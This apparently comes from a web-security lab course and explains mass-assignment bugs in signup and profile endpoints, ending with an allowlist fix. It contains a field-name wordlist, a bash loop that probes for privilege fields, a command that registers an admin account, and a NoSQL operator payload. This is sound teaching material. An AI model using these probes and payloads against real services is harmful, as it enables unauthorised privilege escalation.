# Lab 09 — Signup

## The bug

```python
row = {**DEFAULTS, **payload}
USERS[row["username"]] = row
```

One line, and it is the whole vulnerability. The request body is merged into
the stored record wholesale. The model has `is_admin` and `credits` columns and
nothing between the wire and the store decides which columns a stranger may
name.

You will meet this exact line as:

* Rails `User.new(params[:user])` without `permit`
* Django `ModelForm` with `fields = "__all__"`
* Sequelize / TypeORM `User.create(req.body)`
* Spring `@ModelAttribute` binding onto an entity
* Go `json.Unmarshal(body, &user)` straight onto the DB struct
* any `Object.assign(record, req.body)`

## Finding it without the source

You cannot see `DEFAULTS`. You infer it. Three sources, in order of yield:

**1. Read what comes back.** A create or update endpoint usually echoes the
object. Every field in the response is a candidate field in the request.

**2. Read the neighbouring endpoint.** `GET /api/me`, `GET /api/users/1`, a
profile page's embedded JSON — all of them name columns.

**3. Guess the vocabulary.** It is a short list and it is the same everywhere:

```
is_admin isAdmin admin role roles is_staff is_superuser
verified email_verified confirmed active enabled
credits balance quota plan tier subscription
owner_id user_id tenant_id account_id organization_id
created_at id uuid password_hash mfa_enabled
```

Sweep them one per replay and watch the echoed object change:

```bash
for f in is_admin isAdmin role is_staff verified credits; do
  printf '%-12s ' "$f"
  h5i websec replay req_0 --session lab09 --create --reset-budget \
      --set method=POST --set path=/api/register \
      --set header.Content-Type=application/json \
      --set "json.username=probe-$f" --set "json.$f=true" |
    python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["status"])'
done
```

## The exploit

```bash
h5i websec replay req_0 --session lab09 --create \
    --set method=POST --set path=/api/register \
    --set header.Content-Type=application/json \
    --set json.username=climber --set json.email=c@example.test \
    --set json.password=hunter2 --set json.is_admin=true
```

## Types matter as much as names

`--set json.is_admin=true` sends a JSON **boolean**. h5i uses a `--set` value as
JSON when it parses as JSON, and as a string otherwise. That distinction is not
cosmetic:

```
json.is_admin=true      → true       (boolean)
json.is_admin="true"    → "true"     (string — truthy in Python and JS!)
json.role=admin         → "admin"    (string)
json.password={"$gt":""} → object     (Lab 15 — the whole exploit)
```

A server that does `if row["is_admin"]` accepts the string. A server that does
`if row["is_admin"] is True` does not. When a probe fails, try the other type
before you conclude the field is filtered.

## Update is usually softer than create

Teams remember to allowlist the signup form and forget `PATCH /api/me`, because
"the user is already authenticated". Test both, and test the nested case: if the
object has a sub-object, try `--set json.profile.role=admin`.

## The fix

Allowlist the fields, at the boundary, by name:

```python
allowed = {"username", "email", "password"}
row = {**DEFAULTS, **{k: v for k, v in payload.items() if k in allowed}}
```

Never blocklist — a blocklist is a list of the columns that existed on the day
it was written. And keep privilege fields on a different object entirely, so
that no request body can name them at all.

## h5i technique

`--set json.<field>=<value>` with JSON-typed values; `--create` for fields the
captured request never had; sweeping a wordlist through `--reset-budget`.
